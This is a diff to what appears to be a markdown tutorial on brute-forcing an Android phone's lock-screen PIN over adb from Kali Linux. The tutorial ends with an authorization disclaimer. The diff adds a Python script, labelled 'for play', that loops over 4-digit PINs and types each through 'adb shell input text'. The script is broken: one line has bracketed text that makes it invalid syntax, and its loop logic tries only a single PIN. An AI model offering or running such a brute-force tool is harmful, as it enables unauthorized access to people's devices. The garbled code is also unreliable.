@@ -43,3 +43,22 @@ This is the step-by-step process for attempting a brute force attack using Kali 
 6. **Monitor Progress**: Monitor the output of the script to see if it successfully unlocks the phone. You might also want to physically check the phone's screen periodically.
 
 Remember to use this method responsibly and only on devices for which you have proper authorization. Unauthorized access to devices is illegal and unethical.
+
+# for play
+
+import itertools
+import subprocess
+
+PIN_LENGTH = 4
+START_PIN = 1235 [The passward of your phon]
+PIN_RANGE = range(0, 10)
+
+for pin in itertools.product(PIN_RANGE, repeat=PIN_LENGTH):
+    pin_str = ''.join(map(str, pin))
+    if int(pin_str) < START_PIN:
+        continue
+    command = f'adb shell input text {pin_str} && adb shell input keyevent 66'
+    subprocess.run(command, shell=True)
+    if int(pin_str) == START_PIN:
+        break
+
